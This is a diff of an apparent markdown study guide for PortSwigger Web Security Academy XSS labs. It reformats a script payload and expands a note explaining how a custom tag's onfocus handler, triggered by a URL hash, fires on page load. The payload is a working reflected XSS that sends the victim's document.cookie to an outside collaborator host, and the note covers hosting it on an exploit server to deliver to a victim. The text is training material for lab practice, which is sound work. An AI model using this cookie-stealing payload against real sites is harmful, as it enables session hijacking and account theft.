@@ -252,11 +252,11 @@ https://TARGET.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransfo
 
 ```
 <script>
-location='https://TARGET.net/?search=<xss+id=x+onfocus=document.location='https://Collaborator.COM/?c='+document.cookie tabindex=1>#x';
+location = 'https://TARGET.net/?search=<xss+id=x+onfocus=document.location='https://Collaborator.COM/?c='+document.cookie tabindex=1>#x';
 </script>
 ```
    
->Hosted payload script on exploit server in an **iframe**, and send to victim. Below is the above payload but URL-encoded format.  
+>**Note:** The custom tag with the ID ```x```, which contains an **onfocus** event handler that triggers the ```document.location``` function. The **HASH** character at the end of the URL focuses on this element as soon as the page is loaded, causing the payload to be called. Host the payload script on the exploit server in **script** tags, and send to victim. Below is the above payload but URL-encoded format.  
 
 ```
 <script>
